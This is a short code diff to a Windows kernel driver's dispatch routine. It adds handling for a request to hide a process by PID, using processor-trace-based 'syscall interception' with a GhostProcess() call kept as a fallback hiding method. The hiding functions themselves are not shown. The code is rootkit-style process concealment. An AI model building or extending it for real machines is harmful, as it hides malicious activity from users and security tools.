@@ -106,7 +106,22 @@ NTSTATUS DriverDispatch(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP Irp)
 		}
 
 		ULONG targetPid = data->TargetPID;
+		KdPrint(("[+] Request to hide process PID: %d\n", targetPid));
+		
+		// Check if PT hooking is initialized
+		if (!g_PtContext.IsInitialized) {
+			KdPrint(("[-] PT hooking not initialized\n"));
+			status = STATUS_NOT_READY;
+			break;
+		}
+		
+		// Enable PT tracing for syscall interception
+		EnablePtTracing();
+		KdPrint(("[+] PT-based hiding enabled for PID: %d\n", targetPid));
+		
+		// Fallback to traditional hiding method if needed
 		GhostProcess(targetPid);
+		
 		break;
 	}
 
